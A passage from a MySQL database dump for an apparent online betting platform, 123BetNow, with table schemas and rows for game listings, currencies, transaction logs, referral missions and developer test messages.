(8, 'Tron', 'https://images-storage-bucket.s3.ap-southeast-1.amazonaws.com/123betnow/listing/trx.png', '', 'https://tronscan.org/#/token/0/transfers', 'TRX', '1.00000000', 1, '#A30F11'),
(9, 'Herobook', 'https://apiv2.123betnow.net/images/hbg-coin.svg', '0x8c2da84ea88151109478846cc7c6c06c481dbe97', 'https://bscscan.com/address/', 'HBG', '1.00000000', 1, '#19A890');

-- --------------------------------------------------------

--
-- Table structure for table `list_game`
--

DROP TABLE IF EXISTS `list_game`;
CREATE TABLE IF NOT EXISTS `list_game` (
  `id` int(11) NOT NULL,
  `image` text NOT NULL,
  `name` varchar(150) NOT NULL,
  `display_name` varchar(150) NOT NULL,
  `show` int(11) NOT NULL,
  `url_play` text,
  `dealer` varchar(255) NOT NULL,
  `type` int(11) NOT NULL COMMENT '1:Recommended, 2:Trending, 3:Hot',
  `game_type_id` int(11) NOT NULL DEFAULT '0',
  `icon_game` text,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `list_game`
--

INSERT INTO `list_game` (`id`, `image`, `name`, `display_name`, `show`, `url_play`, `dealer`, `type`, `game_type_id`, `icon_game`, `created_at`, `updated_at`) VALUES
(1, 'https://images-storage-bucket.s3.ap-southeast-1.amazonaws.com/emato/product/62c518a14a359.png', 'AE sexy', 'AE sexy', 1, NULL, 'AeSexy', 1, 1, 'https://media.123betnow.net/list/game/icon_6359f18129a7a.png', '2022-09-25 06:56:48', '2022-09-21 06:56:48'),
(2, 'https://media.eggsbook.com/ecosystem/baccarat-wm.png', 'Casino Evolution', 'Casino Evolution', 1, NULL, 'Evolution', 1, 1, 'https://media.123betnow.net/list/game/icon_6359f21933532.png', '2022-09-24 06:56:48', '2022-09-21 06:56:48'),
(3, 'https://media.eggsbook.com/ecosystem/sportbook.png', 'Agin SportBook', 'Agin SportBook', 0, NULL, 'Agin', 3, 3, 'https://media.123betnow.net/list/game/icon_6359f22b16e16.png', '2022-09-23 06:56:48', '2022-09-21 06:56:48'),
(4, 'https://media.eggsbook.com/ecosystem/fish.png', 'Agin Fish Shooter', 'Agin Fish Shooter', 0, NULL, 'Agin', 2, 2, 'https://media.123betnow.net/list/game/icon_6359f23a65f90.png', '2022-09-22 06:56:48', '2022-09-21 06:56:48'),
(5, 'https://media.eggsbook.com/ecosystem/gameslot.png', 'Agin Slot', 'Agin Slot', 0, NULL, 'Agin', 2, 4, 'https://media.123betnow.net/list/game/icon_6359f258a4e51.png', '2022-09-21 06:56:48', '2022-09-21 06:56:48'),
(7, 'https://media.eggsbook.com/ecosystem/baccarat-wm.png', 'Baccarat', 'Baccarat', 0, 'https://wm111.net/', 'Casino', 3, 1, 'https://media.123betnow.net/list/game/icon_6359f2aaab223.png', '2021-09-30 06:56:48', '2022-09-21 06:56:48'),
(8, 'https://media.eggsbook.com/ecosystem/dragontiger-wm.png', 'DRAGON TIGER', 'Dragon&Tiger', 0, 'https://wm111.net/', 'Casino', 1, 1, 'https://media.123betnow.net/list/game/icon_6359f2dc3a14d.png', '2021-09-29 06:56:48', '2022-09-21 06:56:48'),
(9, 'https://media.eggsbook.com/ecosystem/sicbo-wm.png', 'SIC BO', 'SIC BO', 0, 'https://wm111.net/', 'Casino', 0, 1, 'https://media.123betnow.net/list/game/icon_6359f2ee57ad2.png', '2021-09-28 06:56:48', '2022-09-21 06:56:48'),
(10, 'https://media.eggsbook.com/ecosystem/roulette-wm.png', 'ROULETTE', 'ROULETTE', 0, 'https://wm111.net/', 'Casino', 0, 1, 'https://media.123betnow.net/list/game/icon_6359f2ffb5c39.png', '2021-09-27 06:56:48', '2022-09-21 06:56:48'),
(11, 'https://media.eggsbook.com/ecosystem/multibet-wm.png', 'MULTI-BET', 'MULTI-BET', 0, 'https://wm111.net/', 'Casino', 0, 1, 'https://media.123betnow.net/list/game/icon_6359f31c43956.png', '2021-09-26 06:56:48', '2022-09-21 06:56:48'),
(12, 'https://media.eggsbook.com/ecosystem/sedie.png', 'Se Die', 'Se Die', 0, 'https://wm111.net/', 'Casino', 0, 1, 'https://media.123betnow.net/list/game/icon_6359f3261a266.png', '2021-09-25 06:56:48', '2022-09-21 06:56:48'),
(13, 'https://media.eggsbook.com/ecosystem/niuniu.png', 'Niu Niu', 'Niu Niu', 0, 'https://wm111.net/', 'Casino', 0, 1, 'https://media.123betnow.net/list/game/icon_6359f38175115.png', '2021-09-24 06:56:48', '2022-09-21 06:56:48'),
(14, 'https://media.eggsbook.com/ecosystem/bahar.png', 'Andar Bahar', 'Andar Bahar', 0, 'https://wm111.net/', 'Casino', 0, 1, 'https://media.123betnow.net/list/game/icon_6359f39e40de7.png', '2021-09-23 06:56:48', '2022-09-21 06:56:48'),
(15, 'https://media.eggsbook.com/ecosystem/crab.png', 'Fish - Prawn - Crab', 'Fish - Prawn - Crab', 0, 'https://wm111.net/', 'Casino', 0, 1, 'https://media.123betnow.net/list/game/icon_6359f3ad64db9.png', '2021-09-22 06:56:48', '2022-09-21 06:56:48'),
(16, 'https://media.eggsbook.com/ecosystem/golden.png', 'Golden Flower', 'Golden Flower', 0, 'https://wm111.net/', 'Casino', 0, 1, 'https://media.123betnow.net/list/game/icon_6359f3b892b98.png', '2021-09-21 06:56:48', '2022-09-21 06:56:48'),
(17, 'https://media.eggsbook.com/ecosystem/fantan.png', 'Fantan', 'Fantan', 0, 'https://wm111.net/', 'Casino', 0, 1, 'https://media.123betnow.net/list/game/icon_6359f3d60aa26.png', '2021-09-20 06:56:48', '2022-09-21 06:56:48'),
(18, 'https://media.123betnow.net/list/game/image_63636a3001705.png', 'SportsBook', 'SportsBook', 1, NULL, 'Sbobet', 0, 0, 'https://media.123betnow.net/list/game/icon_63636a2feafb9.png', '2022-10-28 09:14:09', '2022-10-28 09:14:09'),
(19, 'https://media.123betnow.net/list/game/image_63636a4369357.png', 'Casino', 'Casino', 1, NULL, 'Sbobet', 0, 0, NULL, '2022-10-28 09:14:09', '2022-10-28 09:14:09'),
(20, '#', 'Games', 'Games', 0, NULL, 'Sbobet', 0, 0, NULL, '2022-10-28 09:14:09', '2022-10-28 09:14:09'),
(21, 'https://media.123betnow.net/list/game/image_63636b3050588.png', 'VirtualSports', 'VirtualSports', 1, NULL, 'Sbobet', 0, 0, NULL, '2022-10-28 09:14:09', '2022-10-28 09:14:09'),
(22, 'https://media.123betnow.net/list/game/image_63636ac209e59.png', 'SeamlessGame', 'SeamlessGame', 1, NULL, 'Sbobet', 0, 0, NULL, '2022-10-28 09:14:09', '2022-10-28 09:14:09'),
(23, 'https://media.123betnow.net/list/game/image_63636af9cbc17.png', 'ThirdPartySportsBook', 'ThirdPartySportsBook', 1, NULL, 'Sbobet', 0, 0, NULL, '2022-10-28 09:14:09', '2022-10-28 09:14:09'),
(24, '#', '568WinSportsbook', '568WinSportsbook', 0, NULL, 'Sbobet', 0, 0, NULL, '2022-10-28 09:15:02', '2022-10-28 09:15:02'),
(25, 'https://media.123betnow.net/list/game/image_63636b3050588.png', 'SboLive', 'SboLive', 1, NULL, 'Sbobet', 0, 0, NULL, '2022-10-28 09:15:34', '2022-10-28 09:15:34');

-- --------------------------------------------------------

--
-- Table structure for table `list_game_v2`
--

DROP TABLE IF EXISTS `list_game_v2`;
CREATE TABLE IF NOT EXISTS `list_game_v2` (
  `id` int(11) NOT NULL,
  `image` text COLLATE utf8mb4_unicode_ci,
  `name` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL,
  `display_name` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL,
  `portfolio` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `show` int(11) NOT NULL,
  `parent` int(11) NOT NULL,
  `url_play` text COLLATE utf8mb4_unicode_ci,
  `dealer` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `type` int(11) NOT NULL COMMENT '1:Recommended, 2:Trending, 3:Hot',
  `game_type_id` int(11) NOT NULL DEFAULT '0',
  `icon_game` text COLLATE utf8mb4_unicode_ci,
  `status` tinyint(4) NOT NULL COMMENT '-1: Huy, 0: Pending, 1: Duyet',
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `list_game_v2`
--

INSERT INTO `list_game_v2` (`id`, `image`, `name`, `display_name`, `portfolio`, `show`, `parent`, `url_play`, `dealer`, `type`, `game_type_id`, `icon_game`, `status`, `created_at`, `updated_at`) VALUES
(1, 'https://apiv2.123betnow.net/images/name-game/casino.png', 'Live Casino', 'livecasino', 'SeamlessGame', 1, 0, 'https://ex-api-yy.xxttgg.com', 'livecasino', 1, 1, 'https://apiv2.123betnow.net/images/name-game/casino.png', 1, '2023-10-02 09:42:28', '2023-10-02 09:42:28'),
(2, 'https://apiv2.123betnow.net/images/name-game/sport.png', 'Sports', 'sports', 'SportsBook', 1, 0, 'https://ex-api-yy.xxttgg.com', 'sports', 1, 1, 'https://apiv2.123betnow.net/images/name-game/sport.png', 1, '2023-10-02 09:42:28', '2023-10-02 09:42:28'),
(3, 'https://apiv2.123betnow.net/images/name-game/iconslotfish.png', 'Slot / Fish shooting / Lottery', 'slot_shooting_fish', 'SeamlessGame', 1, 0, 'https://ex-api-yy.xxttgg.com', 'slot_shooting_fish', 1, 1, 'https://apiv2.123betnow.net/images/name-game/iconslotfish.png', 1, '2023-10-02 09:42:28', '2023-10-02 09:42:28'),
(101, 'https://apiv2.123betnow.net/images/name-game/wmcasino.png', 'WM Casino', 'wmcasino', 'SeamlessGame', 1, 1, '&gpid=0&gameid=0&lang=en', 'wmcasino', 1, 1, 'https://apiv2.123betnow.net/images/name-game/wmcasino.png', 1, '2023-10-02 09:42:28', '2023-10-02 09:42:28'),
(102, 'https://apiv2.123betnow.net/images/name-game/aesexy.png', 'Sexy Baccarat', 'sexybaccarat', 'SeamlessGame', 1, 1, '&gpid=7&gameid=0&lang=en', 'sexybaccarat', 1, 1, 'https://apiv2.123betnow.net/images/name-game/aesexy.png', 1, '2023-10-02 09:42:28', '2023-10-02 09:42:28'),
(103, 'https://apiv2.123betnow.net/images/name-game/sagaming.png', 'SA Gaming', 'sagaming', 'SeamlessGame', 1, 1, '&gpid=19&gameid=0&lang=en', 'sagaming', 1, 1, 'https://apiv2.123betnow.net/images/name-game/sagaming.png', 1, '2023-10-02 09:42:28', '2023-10-02 09:42:28'),
(104, 'https://apiv2.123betnow.net/images/name-game/dreamgaming.png', 'Dream Gaming', 'dreamgaming', 'SeamlessGame', 1, 1, '&gpid=1030&gameid=0&lang=en', 'dreamgaming', 1, 1, 'https://apiv2.123betnow.net/images/name-game/dreamgaming.png', 1, '2023-10-02 09:42:28', '2023-10-02 09:42:28'),
(105, 'https://apiv2.123betnow.net/images/name-game/evolution.png', 'Evolution', 'evolution', 'SeamlessGame', 1, 1, '&gpid=20&gameid=0&lang=en', 'evolution', 1, 1, 'https://apiv2.123betnow.net/images/name-game/evolution.png', 1, '2023-10-02 09:42:28', '2023-10-02 09:42:28'),
(201, 'https://apiv2.123betnow.net/images/name-game/saba.png', 'SaBa', 'saba', 'ThirdPartySportsBook', 1, 2, '&gpid=44&gameid=0&lang=en', 'saba', 1, 1, 'https://apiv2.123betnow.net/images/name-game/saba.png', 1, '2023-10-02 09:42:28', '2023-10-02 09:42:28'),
(202, 'https://apiv2.123betnow.net/images/name-game/sbobet.png', 'SBO', 'sbo', 'SportsBook', 1, 2, '&lang=en&oddstyle=MY&theme=sbo&oddsmode=double&recommendmatchid=24503959', 'sbo', 1, 1, 'https://apiv2.123betnow.net/images/name-game/sbobet.png', 1, '2023-10-02 09:42:28', '2023-10-02 09:42:28'),
(301, 'https://apiv2.123betnow.net/images/name-game/cq9.png', 'CQ9', 'cq9', 'SeamlessGame', 1, 3, '&gpid=2&gameid=0&lang=en', 'cq9', 1, 1, 'https://apiv2.123betnow.net/images/name-game/cq9.png', 1, '2023-10-02 09:42:28', '2023-10-02 09:42:28'),
(302, 'https://apiv2.123betnow.net/images/name-game/tcgaming.png', 'TCGaming', 'tcgaming', 'SeamlessGame', 0, 3, '&gpid=1012&gameid=0&lang=en', 'tcgaming', 1, 1, 'https://apiv2.123betnow.net/images/name-game/tcgaming.png', 0, '2023-10-02 09:42:28', '2023-10-02 09:42:28');

-- --------------------------------------------------------

--
-- Table structure for table `log`
--

DROP TABLE IF EXISTS `log`;
CREATE TABLE IF NOT EXISTS `log` (
  `Log_ID` int(11) NOT NULL,
  `Log_User` varchar(20) NOT NULL COMMENT 'ID User (users)',
  `Log_Action` text NOT NULL COMMENT 'Tiêu đề mail',
  `Log_Comment` text NOT NULL,
  `Log_CreatedAt` datetime NOT NULL,
  `Log_UpdatedAt` datetime NOT NULL,
  `Log_Status` int(11) NOT NULL COMMENT '1: Đã gửi',
  `Log_Amount` decimal(18,8) DEFAULT NULL COMMENT 'Số tiền'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `logmoney`
--

DROP TABLE IF EXISTS `logmoney`;
CREATE TABLE IF NOT EXISTS `logmoney` (
  `logMoney_ID` int(11) NOT NULL,
  `logMoney_User` int(11) NOT NULL,
  `logMoney_SubAccount` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `logMoney_Balance` decimal(18,8) NOT NULL,
  `logMoney_Fee` decimal(18,8) DEFAULT '0.00000000',
  `logMoney_OldBalance` decimal(18,8) NOT NULL,
  `logMoney_Currency` int(11) DEFAULT NULL,
  `logMoney_Rate` decimal(18,8) DEFAULT NULL,
  `logMoney_Action` int(11) NOT NULL,
  `logMoney_Log` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `logMoney_Datetime` datetime NOT NULL,
  `logMoney_Hash` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `logMoney_Status` tinyint(1) NOT NULL,
  `logMoney_Confirm` int(1) DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `log_admin`
--

DROP TABLE IF EXISTS `log_admin`;
CREATE TABLE IF NOT EXISTS `log_admin` (
  `id` int(11) NOT NULL,
  `user` varchar(20) NOT NULL,
  `action` text NOT NULL,
  `comment` text NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `log_mail`
--

DROP TABLE IF EXISTS `log_mail`;
CREATE TABLE IF NOT EXISTS `log_mail` (
  `Log_ID` int(11) NOT NULL,
  `Log_User` int(11) NOT NULL,
  `Log_Email` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `Log_Action` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `Log_Content` text CHARACTER SET utf8 COLLATE utf8_unicode_ci,
  `Log_DateTime` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `log_user`
--

DROP TABLE IF EXISTS `log_user`;
CREATE TABLE IF NOT EXISTS `log_user` (
  `id` int(11) NOT NULL,
  `action` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `action_id` int(11) DEFAULT NULL,
  `user` int(11) NOT NULL,
  `ip` varchar(20) COLLATE utf8_unicode_ci NOT NULL,
  `comment` text COLLATE utf8_unicode_ci NOT NULL,
  `datetime` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `matday`
--

DROP TABLE IF EXISTS `matday`;
CREATE TABLE IF NOT EXISTS `matday` (
  `matday_ID` int(11) NOT NULL,
  `matday_User` varchar(11) NOT NULL,
  `matday_error` int(10) NOT NULL COMMENT '1: Không nhận; 2:x2; 3: hoàn tiền; 4: đổi lệnh',
  `matday_Status` tinyint(1) NOT NULL,
  `matday_Datetime` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `message_bots`
--

DROP TABLE IF EXISTS `message_bots`;
CREATE TABLE IF NOT EXISTS `message_bots` (
  `id` int(11) NOT NULL,
  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `description` text CHARACTER SET utf8 COLLATE utf8_unicode_ci,
  `img` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `message_bots`
--

INSERT INTO `message_bots` (`id`, `title`, `description`, `img`, `user_id`, `created_at`) VALUES
(1, '123', NULL, '', 969462, '2022-02-22 08:36:13'),
(2, '123', NULL, '', 969462, '2022-02-22 08:37:07'),
(3, '123', NULL, '', 969462, '2022-02-22 08:37:21'),
(4, '123', NULL, '', 969462, '2022-02-22 08:37:47'),
(5, '123', NULL, '', 969462, '2022-02-22 08:38:25'),
(6, '23', NULL, '', 969462, '2022-02-22 08:39:04'),
(7, '23', 'ấvv ađá ada', '', 969462, '2022-02-22 08:39:42'),
(8, '23', 'ấvv ađá ada', '', 969462, '2022-02-22 08:39:50'),
(9, '123123', 'a a a â', '', 969462, '2022-02-22 08:40:22'),
(10, '123123', 'a a a â', '', 969462, '2022-02-22 08:41:05'),
(11, '123123', 'a a a â', '', 969462, '2022-02-22 08:41:32'),
(12, '12313', 'Description(muốn xuống dòng cần thêm \"<br>\")', '', 969462, '2022-02-22 08:47:46'),
(13, '12313', 'Description(muốn xuống dòng cần thêm', '', 969462, '2022-02-22 08:47:56'),
(14, '12313', 'Description(muốn xuống dòng cần thêm', '', 969462, '2022-02-22 08:49:38'),
(15, '12313', 'Description(muốn xuống dòng cần thêm', '', 969462, '2022-02-22 08:50:04'),
(16, '12313', 'Description(muốn xuống dòng cần thêm', '', 969462, '2022-02-22 08:50:15'),
(17, 'Tao nè', 'scâc adâ', '', 969462, '2022-02-22 08:52:50'),
(18, 'âc', '12412 141 241 414', '', 969462, '2022-02-22 08:53:17'),
(19, 'âc', '12412 141 241 414', '', 969462, '2022-02-22 08:55:12'),
(20, 'ờ ha', 'câc a dá da đa ad sad ad a d', '', 969462, '2022-02-22 08:57:22'),
(21, '123', '123123. gầ', '', 969462, '2022-02-22 08:58:06'),
(22, 'dâd', 'ad12 123 123 12', '', 969462, '2022-02-22 08:59:12'),
(23, '123', 'dâf fad\r\ná\r\nađa\r\n\r\nada\r\nda\r\nda', '', 969462, '2022-02-22 09:00:03'),
(24, '123', 'dâf fad\r\ná\r\nađa\r\n\r\nada\r\nda\r\nda', '', 969462, '2022-02-22 09:00:18'),
(25, 'ađâ', 'adâ\r\ná\r\nd\r\nad\r\nqe21', '', 969462, '2022-02-22 09:00:43'),
(26, 'ađâ', 'adâ\r\ná\r\nd\r\nad\r\nqe21', '', 969462, '2022-02-22 09:01:47'),
(27, 'ađâ', 'adâ\r\ná\r\nd\r\nad\r\nqe21', '', 969462, '2022-02-22 09:02:27'),
(28, 'ađâ', 'adâ\r\ná\r\nd\r\nad\r\nqe21', '', 969462, '2022-02-22 09:03:10'),
(29, 'ađâ', 'adâ\r\ná\r\nd\r\nad\r\nqe21', '', 969462, '2022-02-22 09:03:48'),
(30, 'dmn', 'dadà \r\n123123', '', 969462, '2022-02-22 09:04:36'),
(31, 'caca', 'ada', '', 969462, '2022-02-22 09:07:53'),
(32, '123', '3214', '', 969462, '2022-02-22 09:09:11'),
(33, '123', 'dầ', '', 969462, '2022-02-22 09:09:38'),
(34, '123', '141adà', '', 969462, '2022-02-22 09:11:05'),
(35, '1231', 'àà', '', 969462, '2022-02-22 09:13:54'),
(36, '1231', 'àà', '', 969462, '2022-02-22 09:14:33'),
(37, '1231', 'àà', '', 969462, '2022-02-22 09:15:18'),
(38, '1231', 'àà', '', 969462, '2022-02-22 09:15:27'),
(39, '123', 'sdà', '', 969462, '2022-02-22 09:16:11'),
(40, '123', '12à', '', 969462, '2022-02-22 09:16:36'),
(41, '131', 'đá', '', 969462, '2022-02-22 09:17:25'),
(42, '131', 'đá', '', 969462, '2022-02-22 09:17:49'),
(43, '131', 'đá', '', 969462, '2022-02-22 09:18:56'),
(44, '131', 'đá', '', 969462, '2022-02-22 09:29:56'),
(45, '131', 'đá', '', 969462, '2022-02-22 09:31:16'),
(46, '123', 'ầ', '', 969462, '2022-02-22 09:35:02'),
(47, '123', 'âfà', '', 969462, '2022-02-22 09:46:36'),
(48, '123', '131', '', 969462, '2022-02-22 09:47:49'),
(49, NULL, NULL, 'https://media.123betnow.net/message/image_1645523416.jpeg', 969462, '2022-02-22 09:50:16'),
(50, '123', 'ầ ad\r\nad', '', 969462, '2022-02-22 09:56:39'),
(51, '123', 'ầ ad\r\nad', '', 969462, '2022-02-22 09:57:30'),
(52, '123', 'ầ ad\r\nad', '', 969462, '2022-02-22 10:01:19'),
(53, '123', 'ầ ad\r\nad', '', 969462, '2022-02-22 10:02:32'),
(54, '123', 'ad', '', 969462, '2022-02-22 10:05:02'),
(55, '123', 'ád', '', 969462, '2022-02-22 10:05:19'),
(56, 'Long suy', 'Con chó ăn cứt!!!\r\nCon chó ăn cứt!!!\r\n\r\nCon chó ăn cứt!!!', 'https://media.123betnow.net/message/image_1645524420.jpeg', 969462, '2022-02-22 10:07:00'),
(57, '123', 'à', '', 969462, '2022-02-22 10:09:22'),
(58, '123123', 'rgergargavrgaeraer aer gaergerger egerg e', '', 123123, '2022-02-22 10:36:07'),
(59, '123', '123', '', 969462, '2022-02-23 08:51:59'),
(60, 'test ne', 'afaf afa fa fa fafa\r\naf\r\nafaf\r\na\r\nfa\r\nf\r\naf\r\na\r\nfafa', '', 969462, '2022-03-01 03:21:56'),
(61, 'test ne', 'afaf afa fa fa fafa\r\naf\r\nafaf\r\na\r\nfa\r\nf\r\naf\r\na\r\nfafa', '', 969462, '2022-03-01 03:24:47'),
(62, '123', '321', '', 123123, '2022-03-01 04:28:17'),
(63, '23r23r23r', 'r23r', '', 123123, '2022-03-01 04:28:30'),
(64, 'Kyo test', 'Kyo test', '', 123123, '2022-03-01 04:28:40'),
(65, 'kyo test 1', 'kyo test 2', '', 123123, '2022-03-01 04:33:25'),
(66, '123321', 'kyo', '', 123123, '2022-03-01 04:36:01'),
(67, NULL, 'adâda', '', 969462, '2022-03-01 07:22:23'),
(68, '1231', 'adâda', '', 969462, '2022-03-01 07:22:40'),
(69, 'ađâ', 'adâđâ', '', 969462, '2022-03-01 07:24:06'),
(70, 'ađâ', NULL, '', 969462, '2022-03-01 07:26:18'),
(71, NULL, NULL, 'https://media.123betnow.net/message/image_1646120355.jpeg', 969462, '2022-03-01 07:39:15'),
(72, NULL, NULL, 'https://media.123betnow.net/message/image_1646120358.jpeg', 969462, '2022-03-01 07:39:18'),
(73, 'ádầ', 'àâfầ', 'https://media.123betnow.net/message/image_1646120369.jpeg', 969462, '2022-03-01 07:39:29'),
(74, 'đâ1', '313', '', 969462, '2022-03-01 07:40:36'),
(75, 'đâ1', '313', '', 969462, '2022-03-01 07:40:51');

-- --------------------------------------------------------

--
-- Table structure for table `migrations`
--

DROP TABLE IF EXISTS `migrations`;
CREATE TABLE IF NOT EXISTS `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(1, '2014_10_12_000000_create_users_table', 1),
(2, '2016_06_01_000001_create_oauth_auth_codes_table', 2),
(3, '2016_06_01_000002_create_oauth_access_tokens_table', 2),
(4, '2016_06_01_000003_create_oauth_refresh_tokens_table', 2),
(5, '2016_06_01_000004_create_oauth_clients_table', 2),
(6, '2016_06_01_000005_create_oauth_personal_access_clients_table', 2),
(7, '2014_10_12_100000_create_password_resets_table', 3),
(8, '2020_10_20_052326_historysa', 3);

-- --------------------------------------------------------

--
-- Table structure for table `mission`
--

DROP TABLE IF EXISTS `mission`;
CREATE TABLE IF NOT EXISTS `mission` (
  `id` int(11) NOT NULL,
  `name` text COLLATE utf8_unicode_ci NOT NULL,
  `description` text COLLATE utf8_unicode_ci NOT NULL,
  `icon` text COLLATE utf8_unicode_ci,
  `step` int(4) NOT NULL,
  `unit` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `expired` varchar(50) COLLATE utf8_unicode_ci DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `mission`
--

INSERT INTO `mission` (`id`, `name`, `description`, `icon`, `step`, `unit`, `expired`, `status`, `created_at`, `updated_at`) VALUES
(1, 'DAILY ATTENDANCE', 'Login in 123Betnow system and personal trade reach $300', NULL, 300, '$', '24h', 1, '2021-04-12 11:14:05', '2021-04-12 11:14:05'),
(2, 'WEEKLY ATTENDANCE', 'Continuously login 7 days in 123Betnow system', NULL, 7, 'Days', '7d', 1, '2021-04-12 11:14:05', '2021-04-12 11:14:05'),
(3, 'TALENTED LEADER', 'Have 10 F1 and have a personal trading volume of $200 within 7 days', NULL, 10, 'F1', '7d', 1, '2021-04-12 11:14:05', '2021-04-12 11:14:05');

-- --------------------------------------------------------

--
-- Table structure for table `mission_success`
--

DROP TABLE IF EXISTS `mission_success`;
CREATE TABLE IF NOT EXISTS `mission_success` (
  `id` int(11) NOT NULL,
  `userId` int(11) NOT NULL,
  `mission_id` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `money`
--

DROP TABLE IF EXISTS `money`;
CREATE TABLE IF NOT EXISTS `money` (
  `Money_ID` int(10) UNSIGNED NOT NULL,
  `Money_User` varchar(20) COLLATE utf8_unicode_ci NOT NULL COMMENT 'ID User (users)',
  `Money_USDT` decimal(18,8) NOT NULL DEFAULT '0.00000000' COMMENT 'Số tiền',
  `Money_USDTFee` decimal(18,8) NOT NULL DEFAULT '0.00000000' COMMENT 'Phí',
  `Money_SaleBinary` decimal(18,8) NOT NULL DEFAULT '0.00000000' COMMENT 'Doanh số nhị phân',
  `Money_Investment` int(11) DEFAULT NULL,
  `Money_Game` int(11) DEFAULT NULL,
  `Money_Time` bigint(20) NOT NULL COMMENT 'Thời gian',
  `Money_Comment` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `Money_MoneyAction` int(10) UNSIGNED NOT NULL DEFAULT '0' COMMENT 'MoneyAction_ID (moneyaction)',
  `Money_PromotionAction` varchar(50) COLLATE utf8_unicode_ci DEFAULT NULL,
  `Money_MoneyStatus` int(10) NOT NULL COMMENT '1: Đã duyệt | 2: Xem | -1: Hủy',
  `Money_Token` varchar(200) COLLATE utf8_unicode_ci DEFAULT NULL,
  `Money_TXID` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `Money_Address` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT 'Địa chỉ ví',
  `Money_Currency` int(10) DEFAULT NULL COMMENT 'Loại tiền - Currency_ID (currency)',
  `Money_CurrentAmount` decimal(18,8) NOT NULL DEFAULT '0.00000000' COMMENT 'Số tiền theo loại tiền',
  `Money_CurrencyFrom` tinyint(1) NOT NULL DEFAULT '0',
  `Money_CurrencyTo` tinyint(1) NOT NULL DEFAULT '0',
  `Money_Rate` decimal(18,8) NOT NULL DEFAULT '0.00000000' COMMENT 'Tỷ giá',
  `Money_Confirm` tinyint(1) NOT NULL DEFAULT '0' COMMENT '0: Đang chờ | 1: Đã duyệt | 2: Lỗi | -1: Hủy',
  `Money_Confirm_Time` datetime DEFAULT NULL,
  `Money_IsPaid` tinyint(1) NOT NULL DEFAULT '0',
  `Money_FromAPI` tinyint(1) NOT NULL DEFAULT '0',
  `Money_PayAuto` int(11) DEFAULT NULL COMMENT '0:pending;1:confirm',
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `multiplay_pool` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `moneyaction`
--

DROP TABLE IF EXISTS `moneyaction`;
CREATE TABLE IF NOT EXISTS `moneyaction` (
  `MoneyAction_ID` int(10) UNSIGNED NOT NULL,
  `MoneyAction_Name` varchar(255) COLLATE utf8_unicode_ci NOT NULL COMMENT 'Hình thức sử dụng'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `moneyaction`
--

INSERT INTO `moneyaction` (`MoneyAction_ID`, `MoneyAction_Name`) VALUES
(1, 'Deposit'),
(2, 'Withdraw'),
(3, 'Deposit 123BetNow'),
(4, 'Withdraw 123BetNow'),
(5, 'Deposit From Eggsbook'),
(7, 'Transfer'),
(8, 'Bonus KYC'),
(9, 'Commission Deposit'),
(10, 'Bonus Deposit'),
(11, 'Bonus first bet ticket with SportBook'),
